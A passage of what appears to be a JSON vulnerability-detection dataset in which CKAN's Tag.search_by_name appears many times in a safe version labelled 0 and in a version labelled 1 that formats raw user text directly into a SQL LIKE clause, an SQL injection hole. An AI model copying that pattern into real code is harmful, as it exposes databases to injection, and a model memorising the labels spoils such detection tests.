UserService.get_user_by_username(username)\n        user.set_user_role(requested_role)\n\n    @staticmethod\n    def set_user_mapping_level(username: str, level: str) -> User:\n        \"\"\"\n        Sets the users mapping level\n        :raises: UserServiceError\n        \"\"\"\n        try:\n            requested_level = MappingLevel[level.upper()]\n        except KeyError:\n            raise UserServiceError(f'Unknown role {level} accepted values are BEGINNER, INTERMEDIATE, ADVANCED')\n\n        user = UserService.get_user_by_username(username)\n        user.set_mapping_level(requested_level)\n\n        return user\n\n    @staticmethod\n    def set_user_is_expert(user_id: int, is_expert: bool) -> User:\n        \"\"\"\n        Enabled or disables expert mode for the user\n        :raises: UserServiceError\n        \"\"\"\n        user = UserService.get_user_by_id(user_id)\n        user.set_is_expert(is_expert)\n\n        return user\n\n    @staticmethod\n    def accept_license_terms(user_id: int, license_id: int):\n        \"\"\" Saves the fact user has accepted license terms \"\"\"\n        user = UserService.get_user_by_id(user_id)\n        user.accept_license_terms(license_id)\n\n    @staticmethod\n    def has_user_accepted_license(user_id: int, license_id: int):\n        \"\"\" Checks if user has accepted specified license \"\"\"\n        user = UserService.get_user_by_id(user_id)\n        return user.has_user_accepted_licence(license_id)\n\n    @staticmethod\n    def get_osm_details_for_user(username: str) -> UserOSMDTO:\n        \"\"\"\n        Gets OSM details for the user from OSM API\n        :param username: username in scope\n        :raises UserServiceError, NotFound\n        \"\"\"\n        user = UserService.get_user_by_username(username)\n        osm_dto = OSMService.get_osm_details_for_user(user.id)\n        return osm_dto\n\n    @staticmethod\n    def check_and_update_mapper_level(user_id: int):\n        \"\"\" Check users mapping level and update if they have crossed threshold \"\"\"\n        user = UserService.get_user_by_id(user_id)\n        user_level = MappingLevel(user.mapping_level)\n\n        if user_level == MappingLevel.ADVANCED:\n            return  # User has achieved highest level, so no need to do further checking\n\n        intermediate_level = current_app.config['MAPPER_LEVEL_INTERMEDIATE']\n        advanced_level = current_app.config['MAPPER_LEVEL_ADVANCED']\n\n        try:\n            osm_details = OSMService.get_osm_details_for_user(user_id)\n            if (osm_details.changeset_count > advanced_level and\n                user.mapping_level !=  MappingLevel.ADVANCED.value):\n                user.mapping_level = MappingLevel.ADVANCED.value\n                UserService.notify_level_upgrade(user_id, user.username, 'ADVANCED')\n            elif (intermediate_level < osm_details.changeset_count < advanced_level and\n                user.mapping_level != MappingLevel.INTERMEDIATE.value):\n                user.mapping_level = MappingLevel.INTERMEDIATE.value\n                UserService.notify_level_upgrade(user_id, user.username, 'INTERMEDIATE')\n        except OSMServiceError:\n            # Swallow exception as we don't want to blow up the server for this\n            current_app.logger.error('Error attempting to update mapper level')\n            return\n\n\n        user.save()\n        return user\n\n    def notify_level_upgrade(user_id: int, username: str, level: str):\n        text_template = get_template('level_upgrade_message_en.txt')\n\n        if username is not None:\n            text_template = text_template.replace('[USERNAME]', username)\n\n        text_template = text_template.replace('[LEVEL]', level)\n        level_upgrade_message = Message()\n        level_upgrade_message.to_user_id = user_id\n        level_upgrade_message.subject = 'Mapper Level Upgrade '\n        level_upgrade_message.message = text_template\n        level_upgrade_message.save()\n\n\n    @staticmethod\n    def refresh_mapper_level() -> int:\n        \"\"\" Helper function to run thru all users in the DB and update their mapper level \"\"\"\n        users = User.get_all_users_not_pagainated()\n        users_updated = 1\n        total_users = len(users)\n\n        for user in users:\n            UserService.check_and_update_mapper_level(user.id)\n\n            if users_updated % 50 == 0:\n                print(f'{users_updated} users updated of {total_users}')\n\n            users_updated += 1\n\n        return users_updated\n/n/n/n", "label": 1}, {"id": "f020853c54a1851f196d7fd8897c4620bccf9f6c", "code": "ckan/models/package.py/n/nimport sqlobject\n\ntry:\n    # vdm >= 0.2\n    import vdm.sqlobject.base as vdmbase\n    from vdm.sqlobject.base import State\nexcept:\n    # vdm == 0.1\n    import vdm.base as vdmbase\n    from vdm.base import State\n\n# American spelling ...\nclass License(sqlobject.SQLObject):\n\n    class sqlmeta:\n        _defaultOrder = 'name'\n\n    name = sqlobject.UnicodeCol(alternateID=True)\n    packages = sqlobject.MultipleJoin('Package')\n\n\nclass PackageRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('Package', cascade=True)\n    title = sqlobject.UnicodeCol(default=None)\n    url = sqlobject.UnicodeCol(default=None)\n    download_url = sqlobject.UnicodeCol(default=None)\n    license = sqlobject.ForeignKey('License', default=None)\n    notes = sqlobject.UnicodeCol(default=None)\n\n\nclass TagRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('Tag', cascade=True)\n\n\nclass PackageTagRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('PackageTag', cascade=True)\n\n\nclass Package(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = PackageRevision\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n    \n    name = sqlobject.UnicodeCol(alternateID=True)\n\n    # should be attribute_name, module_name, module_object\n    m2m = [ ('tags', 'ckan.models.package', 'Tag', 'PackageTag') ]\n\n    def add_tag_by_name(self, tagname):\n        try:\n            tag = self.revision.model.tags.get(tagname)\n        except: # TODO: make this specific\n            tag = self.transaction.model.tags.create(name=tagname)\n        self.tags.create(tag=tag)\n\n\nclass Tag(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = TagRevision\n\n    name = sqlobject.UnicodeCol(alternateID=True)\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n\n    m2m = [ ('packages', 'ckan.models.package', 'Package', 'PackageTag') ]\n\n    @classmethod\n    def search_by_name(self, text_query):\n        text_query = str(text_query) # SQLObject chokes on unicode.\n        return self.select(self.q.name.contains(text_query.lower()))\n\n\nclass PackageTag(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = PackageTagRevision\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n    m2m = []\n\n    package = sqlobject.ForeignKey('Package', cascade=True)\n    tag = sqlobject.ForeignKey('Tag', cascade=True)\n\n    package_tag_index = sqlobject.DatabaseIndex('package', 'tag',\n            unique=True)\n\n/n/n/n", "label": 0}, {"id": "f020853c54a1851f196d7fd8897c4620bccf9f6c", "code": "/ckan/models/package.py/n/nimport sqlobject\n\ntry:\n    # vdm >= 0.2\n    import vdm.sqlobject.base as vdmbase\n    from vdm.sqlobject.base import State\nexcept:\n    # vdm == 0.1\n    import vdm.base as vdmbase\n    from vdm.base import State\n\n# American spelling ...\nclass License(sqlobject.SQLObject):\n\n    class sqlmeta:\n        _defaultOrder = 'name'\n\n    name = sqlobject.UnicodeCol(alternateID=True)\n    packages = sqlobject.MultipleJoin('Package')\n\n\nclass PackageRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('Package', cascade=True)\n    title = sqlobject.UnicodeCol(default=None)\n    url = sqlobject.UnicodeCol(default=None)\n    download_url = sqlobject.UnicodeCol(default=None)\n    license = sqlobject.ForeignKey('License', default=None)\n    notes = sqlobject.UnicodeCol(default=None)\n\n\nclass TagRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('Tag', cascade=True)\n\n\nclass PackageTagRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('PackageTag', cascade=True)\n\n\nclass Package(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = PackageRevision\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n    \n    name = sqlobject.UnicodeCol(alternateID=True)\n\n    # should be attribute_name, module_name, module_object\n    m2m = [ ('tags', 'ckan.models.package', 'Tag', 'PackageTag') ]\n\n    def add_tag_by_name(self, tagname):\n        try:\n            tag = self.revision.model.tags.get(tagname)\n        except: # TODO: make this specific\n            tag = self.transaction.model.tags.create(name=tagname)\n        self.tags.create(tag=tag)\n\n\nclass Tag(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = TagRevision\n\n    name = sqlobject.UnicodeCol(alternateID=True)\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n\n    m2m = [ ('packages', 'ckan.models.package', 'Package', 'PackageTag') ]\n\n    @classmethod\n    def search_by_name(self, text_query):\n        text_query_str = str(text_query) # SQLObject chokes on unicode.\n        # Todo: Change to use SQLObject statement objects.\n        sql_query = \"UPPER(tag.name) LIKE UPPER('%%%s%%')\" % text_query_str\n        return self.select(sql_query)\n\n\nclass PackageTag(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = PackageTagRevision\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n    m2m = []\n\n    package = sqlobject.ForeignKey('Package', cascade=True)\n    tag = sqlobject.ForeignKey('Tag', cascade=True)\n\n    package_tag_index = sqlobject.DatabaseIndex('package', 'tag',\n            unique=True)\n\n/n/n/n", "label": 1}, {"id": "f020853c54a1851f196d7fd8897c4620bccf9f6c", "code": "ckan/models/package.py/n/nimport sqlobject\n\ntry:\n    # vdm >= 0.2\n    import vdm.sqlobject.base as vdmbase\n    from vdm.sqlobject.base import State\nexcept:\n    # vdm == 0.1\n    import vdm.base as vdmbase\n    from vdm.base import State\n\n# American spelling ...\nclass License(sqlobject.SQLObject):\n\n    class sqlmeta:\n        _defaultOrder = 'name'\n\n    name = sqlobject.UnicodeCol(alternateID=True)\n    packages = sqlobject.MultipleJoin('Package')\n\n\nclass PackageRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('Package', cascade=True)\n    title = sqlobject.UnicodeCol(default=None)\n    url = sqlobject.UnicodeCol(default=None)\n    download_url = sqlobject.UnicodeCol(default=None)\n    license = sqlobject.ForeignKey('License', default=None)\n    notes = sqlobject.UnicodeCol(default=None)\n\n\nclass TagRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('Tag', cascade=True)\n\n\nclass PackageTagRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('PackageTag', cascade=True)\n\n\nclass Package(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = PackageRevision\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n    \n    name = sqlobject.UnicodeCol(alternateID=True)\n\n    # should be attribute_name, module_name, module_object\n    m2m = [ ('tags', 'ckan.models.package', 'Tag', 'PackageTag') ]\n\n    def add_tag_by_name(self, tagname):\n        try:\n            tag = self.revision.model.tags.get(tagname)\n        except: # TODO: make this specific\n            tag = self.transaction.model.tags.create(name=tagname)\n        self.tags.create(tag=tag)\n\n\nclass Tag(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = TagRevision\n\n    name = sqlobject.UnicodeCol(alternateID=True)\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n\n    m2m = [ ('packages', 'ckan.models.package', 'Package', 'PackageTag') ]\n\n    @classmethod\n    def search_by_name(self, text_query):\n        text_query = str(text_query) # SQLObject chokes on unicode.\n        return self.select(self.q.name.contains(text_query.lower()))\n\n\nclass PackageTag(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = PackageTagRevision\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n    m2m = []\n\n    package = sqlobject.ForeignKey('Package', cascade=True)\n    tag = sqlobject.ForeignKey('Tag', cascade=True)\n\n    package_tag_index = sqlobject.DatabaseIndex('package', 'tag',\n            unique=True)\n\n/n/n/n", "label": 0}, {"id": "f020853c54a1851f196d7fd8897c4620bccf9f6c", "code": "/ckan/models/package.py/n/nimport sqlobject\n\ntry:\n    # vdm >= 0.2\n    import vdm.sqlobject.base as vdmbase\n    from vdm.sqlobject.base import State\nexcept:\n    # vdm == 0.1\n    import vdm.base as vdmbase\n    from vdm.base import State\n\n# American spelling ...\nclass License(sqlobject.SQLObject):\n\n    class sqlmeta:\n        _defaultOrder = 'name'\n\n    name = sqlobject.UnicodeCol(alternateID=True)\n    packages = sqlobject.MultipleJoin('Package')\n\n\nclass PackageRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('Package', cascade=True)\n    title = sqlobject.UnicodeCol(default=None)\n    url = sqlobject.UnicodeCol(default=None)\n    download_url = sqlobject.UnicodeCol(default=None)\n    license = sqlobject.ForeignKey('License', default=None)\n    notes = sqlobject.UnicodeCol(default=None)\n\n\nclass TagRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('Tag', cascade=True)\n\n\nclass PackageTagRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('PackageTag', cascade=True)\n\n\nclass Package(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = PackageRevision\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n    \n    name = sqlobject.UnicodeCol(alternateID=True)\n\n    # should be attribute_name, module_name, module_object\n    m2m = [ ('tags', 'ckan.models.package', 'Tag', 'PackageTag') ]\n\n    def add_tag_by_name(self, tagname):\n        try:\n            tag = self.revision.model.tags.get(tagname)\n        except: # TODO: make this specific\n            tag = self.transaction.model.tags.create(name=tagname)\n        self.tags.create(tag=tag)\n\n\nclass Tag(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = TagRevision\n\n    name = sqlobject.UnicodeCol(alternateID=True)\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n\n    m2m = [ ('packages', 'ckan.models.package', 'Package', 'PackageTag') ]\n\n    @classmethod\n    def search_by_name(self, text_query):\n        text_query_str = str(text_query) # SQLObject chokes on unicode.\n        # Todo: Change to use SQLObject statement objects.\n        sql_query = \"UPPER(tag.name) LIKE UPPER('%%%s%%')\" % text_query_str\n        return self.select(sql_query)\n\n\nclass PackageTag(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = PackageTagRevision\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n    m2m = []\n\n    package = sqlobject.ForeignKey('Package', cascade=True)\n    tag = sqlobject.ForeignKey('Tag', cascade=True)\n\n    package_tag_index = sqlobject.DatabaseIndex('package', 'tag',\n            unique=True)\n\n/n/n/n", "label": 1}, {"id": "f020853c54a1851f196d7fd8897c4620bccf9f6c", "code": "ckan/models/package.py/n/nimport sqlobject\n\ntry:\n    # vdm >= 0.2\n    import vdm.sqlobject.base as vdmbase\n    from vdm.sqlobject.base import State\nexcept:\n    # vdm == 0.1\n    import vdm.base as vdmbase\n    from vdm.base import State\n\n# American spelling ...\nclass License(sqlobject.SQLObject):\n\n    class sqlmeta:\n        _defaultOrder = 'name'\n\n    name = sqlobject.UnicodeCol(alternateID=True)\n    packages = sqlobject.MultipleJoin('Package')\n\n\nclass PackageRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('Package', cascade=True)\n    title = sqlobject.UnicodeCol(default=None)\n    url = sqlobject.UnicodeCol(default=None)\n    download_url = sqlobject.UnicodeCol(default=None)\n    license = sqlobject.ForeignKey('License', default=None)\n    notes = sqlobject.UnicodeCol(default=None)\n\n\nclass TagRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('Tag', cascade=True)\n\n\nclass PackageTagRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('PackageTag', cascade=True)\n\n\nclass Package(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = PackageRevision\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n    \n    name = sqlobject.UnicodeCol(alternateID=True)\n\n    # should be attribute_name, module_name, module_object\n    m2m = [ ('tags', 'ckan.models.package', 'Tag', 'PackageTag') ]\n\n    def add_tag_by_name(self, tagname):\n        try:\n            tag = self.revision.model.tags.get(tagname)\n        except: # TODO: make this specific\n            tag = self.transaction.model.tags.create(name=tagname)\n        self.tags.create(tag=tag)\n\n\nclass Tag(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = TagRevision\n\n    name = sqlobject.UnicodeCol(alternateID=True)\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n\n    m2m = [ ('packages', 'ckan.models.package', 'Package', 'PackageTag') ]\n\n    @classmethod\n    def search_by_name(self, text_query):\n        text_query = str(text_query) # SQLObject chokes on unicode.\n        return self.select(self.q.name.contains(text_query.lower()))\n\n\nclass PackageTag(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = PackageTagRevision\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n    m2m = []\n\n    package = sqlobject.ForeignKey('Package', cascade=True)\n    tag = sqlobject.ForeignKey('Tag', cascade=True)\n\n    package_tag_index = sqlobject.DatabaseIndex('package', 'tag',\n            unique=True)\n\n/n/n/n", "label": 0}, {"id": "f020853c54a1851f196d7fd8897c4620bccf9f6c", "code": "/ckan/models/package.py/n/nimport sqlobject\n\ntry:\n    # vdm >= 0.2\n    import vdm.sqlobject.base as vdmbase\n    from vdm.sqlobject.base import State\nexcept:\n    # vdm == 0.1\n    import vdm.base as vdmbase\n    from vdm.base import State\n\n# American spelling ...\nclass License(sqlobject.SQLObject):\n\n    class sqlmeta:\n        _defaultOrder = 'name'\n\n    name = sqlobject.UnicodeCol(alternateID=True)\n    packages = sqlobject.MultipleJoin('Package')\n\n\nclass PackageRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('Package', cascade=True)\n    title = sqlobject.UnicodeCol(default=None)\n    url = sqlobject.UnicodeCol(default=None)\n    download_url = sqlobject.UnicodeCol(default=None)\n    license = sqlobject.ForeignKey('License', default=None)\n    notes = sqlobject.UnicodeCol(default=None)\n\n\nclass TagRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('Tag', cascade=True)\n\n\nclass PackageTagRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('PackageTag', cascade=True)\n\n\nclass Package(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = PackageRevision\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n    \n    name = sqlobject.UnicodeCol(alternateID=True)\n\n    # should be attribute_name, module_name, module_object\n    m2m = [ ('tags', 'ckan.models.package', 'Tag', 'PackageTag') ]\n\n    def add_tag_by_name(self, tagname):\n        try:\n            tag = self.revision.model.tags.get(tagname)\n        except: # TODO: make this specific\n            tag = self.transaction.model.tags.create(name=tagname)\n        self.tags.create(tag=tag)\n\n\nclass Tag(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = TagRevision\n\n    name = sqlobject.UnicodeCol(alternateID=True)\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n\n    m2m = [ ('packages', 'ckan.models.package', 'Package', 'PackageTag') ]\n\n    @classmethod\n    def search_by_name(self, text_query):\n        text_query_str = str(text_query) # SQLObject chokes on unicode.\n        # Todo: Change to use SQLObject statement objects.\n        sql_query = \"UPPER(tag.name) LIKE UPPER('%%%s%%')\" % text_query_str\n        return self.select(sql_query)\n\n\nclass PackageTag(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = PackageTagRevision\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n    m2m = []\n\n    package = sqlobject.ForeignKey('Package', cascade=True)\n    tag = sqlobject.ForeignKey('Tag', cascade=True)\n\n    package_tag_index = sqlobject.DatabaseIndex('package', 'tag',\n            unique=True)\n\n/n/n/n", "label": 1}, {"id": "f020853c54a1851f196d7fd8897c4620bccf9f6c", "code": "ckan/models/package.py/n/nimport sqlobject\n\ntry:\n    # vdm >= 0.2\n    import vdm.sqlobject.base as vdmbase\n    from vdm.sqlobject.base import State\nexcept:\n    # vdm == 0.1\n    import vdm.base as vdmbase\n    from vdm.base import State\n\n# American spelling ...\nclass License(sqlobject.SQLObject):\n\n    class sqlmeta:\n        _defaultOrder = 'name'\n\n    name = sqlobject.UnicodeCol(alternateID=True)\n    packages = sqlobject.MultipleJoin('Package')\n\n\nclass PackageRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('Package', cascade=True)\n    title = sqlobject.UnicodeCol(default=None)\n    url = sqlobject.UnicodeCol(default=None)\n    download_url = sqlobject.UnicodeCol(default=None)\n    license = sqlobject.ForeignKey('License', default=None)\n    notes = sqlobject.UnicodeCol(default=None)\n\n\nclass TagRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('Tag', cascade=True)\n\n\nclass PackageTagRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('PackageTag', cascade=True)\n\n\nclass Package(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = PackageRevision\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n    \n    name = sqlobject.UnicodeCol(alternateID=True)\n\n    # should be attribute_name, module_name, module_object\n    m2m = [ ('tags', 'ckan.models.package', 'Tag', 'PackageTag') ]\n\n    def add_tag_by_name(self, tagname):\n        try:\n            tag = self.revision.model.tags.get(tagname)\n        except: # TODO: make this specific\n            tag = self.transaction.model.tags.create(name=tagname)\n        self.tags.create(tag=tag)\n\n\nclass Tag(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = TagRevision\n\n    name = sqlobject.UnicodeCol(alternateID=True)\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n\n    m2m = [ ('packages', 'ckan.models.package', 'Package', 'PackageTag') ]\n\n    @classmethod\n    def search_by_name(self, text_query):\n        text_query = str(text_query) # SQLObject chokes on unicode.\n        return self.select(self.q.name.contains(text_query.lower()))\n\n\nclass PackageTag(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = PackageTagRevision\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n    m2m = []\n\n    package = sqlobject.ForeignKey('Package', cascade=True)\n    tag = sqlobject.ForeignKey('Tag', cascade=True)\n\n    package_tag_index = sqlobject.DatabaseIndex('package', 'tag',\n            unique=True)\n\n/n/n/n", "label": 0}, {"id": "f020853c54a1851f196d7fd8897c4620bccf9f6c", "code": "/ckan/models/package.py/n/nimport sqlobject\n\ntry:\n    # vdm >= 0.2\n    import vdm.sqlobject.base as vdmbase\n    from vdm.sqlobject.base import State\nexcept:\n    # vdm == 0.1\n    import vdm.base as vdmbase\n    from vdm.base import State\n\n# American spelling ...\nclass License(sqlobject.SQLObject):\n\n    class sqlmeta:\n        _defaultOrder = 'name'\n\n    name = sqlobject.UnicodeCol(alternateID=True)\n    packages = sqlobject.MultipleJoin('Package')\n\n\nclass PackageRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('Package', cascade=True)\n    title = sqlobject.UnicodeCol(default=None)\n    url = sqlobject.UnicodeCol(default=None)\n    download_url = sqlobject.UnicodeCol(default=None)\n    license = sqlobject.ForeignKey('License', default=None)\n    notes = sqlobject.UnicodeCol(default=None)\n\n\nclass TagRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('Tag', cascade=True)\n\n\nclass PackageTagRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('PackageTag', cascade=True)\n\n\nclass Package(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = PackageRevision\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n    \n    name = sqlobject.UnicodeCol(alternateID=True)\n\n    # should be attribute_name, module_name, module_object\n    m2m = [ ('tags', 'ckan.models.package', 'Tag', 'PackageTag') ]\n\n    def add_tag_by_name(self, tagname):\n        try:\n            tag = self.revision.model.tags.get(tagname)\n        except: # TODO: make this specific\n            tag = self.transaction.model.tags.create(name=tagname)\n        self.tags.create(tag=tag)\n\n\nclass Tag(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = TagRevision\n\n    name = sqlobject.UnicodeCol(alternateID=True)\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n\n    m2m = [ ('packages', 'ckan.models.package', 'Package', 'PackageTag') ]\n\n    @classmethod\n    def search_by_name(self, text_query):\n        text_query_str = str(text_query) # SQLObject chokes on unicode.\n        # Todo: Change to use SQLObject statement objects.\n        sql_query = \"UPPER(tag.name) LIKE UPPER('%%%s%%')\" % text_query_str\n        return self.select(sql_query)\n\n\nclass PackageTag(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = PackageTagRevision\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n    m2m = []\n\n    package = sqlobject.ForeignKey('Package', cascade=True)\n    tag = sqlobject.ForeignKey('Tag', cascade=True)\n\n    package_tag_index = sqlobject.DatabaseIndex('package', 'tag',\n            unique=True)\n\n/n/n/n", "label": 1}, {"id": "f020853c54a1851f196d7fd8897c4620bccf9f6c", "code": "ckan/models/package.py/n/nimport sqlobject\n\ntry:\n    # vdm >= 0.2\n    import vdm.sqlobject.base as vdmbase\n    from vdm.sqlobject.base import State\nexcept:\n    # vdm == 0.1\n    import vdm.base as vdmbase\n    from vdm.base import State\n\n# American spelling ...\nclass License(sqlobject.SQLObject):\n\n    class sqlmeta:\n        _defaultOrder = 'name'\n\n    name = sqlobject.UnicodeCol(alternateID=True)\n    packages = sqlobject.MultipleJoin('Package')\n\n\nclass PackageRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('Package', cascade=True)\n    title = sqlobject.UnicodeCol(default=None)\n    url = sqlobject.UnicodeCol(default=None)\n    download_url = sqlobject.UnicodeCol(default=None)\n    license = sqlobject.ForeignKey('License', default=None)\n    notes = sqlobject.UnicodeCol(default=None)\n\n\nclass TagRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('Tag', cascade=True)\n\n\nclass PackageTagRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('PackageTag', cascade=True)\n\n\nclass Package(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = PackageRevision\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n    \n    name = sqlobject.UnicodeCol(alternateID=True)\n\n    # should be attribute_name, module_name, module_object\n    m2m = [ ('tags', 'ckan.models.package', 'Tag', 'PackageTag') ]\n\n    def add_tag_by_name(self, tagname):\n        try:\n            tag = self.revision.model.tags.get(tagname)\n        except: # TODO: make this specific\n            tag = self.transaction.model.tags.create(name=tagname)\n        self.tags.create(tag=tag)\n\n\nclass Tag(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = TagRevision\n\n    name = sqlobject.UnicodeCol(alternateID=True)\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n\n    m2m = [ ('packages', 'ckan.models.package', 'Package', 'PackageTag') ]\n\n    @classmethod\n    def search_by_name(self, text_query):\n        text_query = str(text_query) # SQLObject chokes on unicode.\n        return self.select(self.q.name.contains(text_query.lower()))\n\n\nclass PackageTag(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = PackageTagRevision\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n    m2m = []\n\n    package = sqlobject.ForeignKey('Package', cascade=True)\n    tag = sqlobject.ForeignKey('Tag', cascade=True)\n\n    package_tag_index = sqlobject.DatabaseIndex('package', 'tag',\n            unique=True)\n\n/n/n/n", "label": 0}, {"id": "f020853c54a1851f196d7fd8897c4620bccf9f6c", "code": "/ckan/models/package.py/n/nimport sqlobject\n\ntry:\n    # vdm >= 0.2\n    import vdm.sqlobject.base as vdmbase\n    from vdm.sqlobject.base import State\nexcept:\n    # vdm == 0.1\n    import vdm.base as vdmbase\n    from vdm.base import State\n\n# American spelling ...\nclass License(sqlobject.SQLObject):\n\n    class sqlmeta:\n        _defaultOrder = 'name'\n\n    name = sqlobject.UnicodeCol(alternateID=True)\n    packages = sqlobject.MultipleJoin('Package')\n\n\nclass PackageRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('Package', cascade=True)\n    title = sqlobject.UnicodeCol(default=None)\n    url = sqlobject.UnicodeCol(default=None)\n    download_url = sqlobject.UnicodeCol(default=None)\n    license = sqlobject.ForeignKey('License', default=None)\n    notes = sqlobject.UnicodeCol(default=None)\n\n\nclass TagRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('Tag', cascade=True)\n\n\nclass PackageTagRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('PackageTag', cascade=True)\n\n\nclass Package(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = PackageRevision\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n    \n    name = sqlobject.UnicodeCol(alternateID=True)\n\n    # should be attribute_name, module_name, module_object\n    m2m = [ ('tags', 'ckan.models.package', 'Tag', 'PackageTag') ]\n\n    def add_tag_by_name(self, tagname):\n        try:\n            tag = self.revision.model.tags.get(tagname)\n        except: # TODO: make this specific\n            tag = self.transaction.model.tags.create(name=tagname)\n        self.tags.create(tag=tag)\n\n\nclass Tag(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = TagRevision\n\n    name = sqlobject.UnicodeCol(alternateID=True)\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n\n    m2m = [ ('packages', 'ckan.models.package', 'Package', 'PackageTag') ]\n\n    @classmethod\n    def search_by_name(self, text_query):\n        text_query_str = str(text_query) # SQLObject chokes on unicode.\n        # Todo: Change to use SQLObject statement objects.\n        sql_query = \"UPPER(tag.name) LIKE UPPER('%%%s%%')\" % text_query_str\n        return self.select(sql_query)\n\n\nclass PackageTag(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = PackageTagRevision\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n    m2m = []\n\n    package = sqlobject.ForeignKey('Package', cascade=True)\n    tag = sqlobject.ForeignKey('Tag', 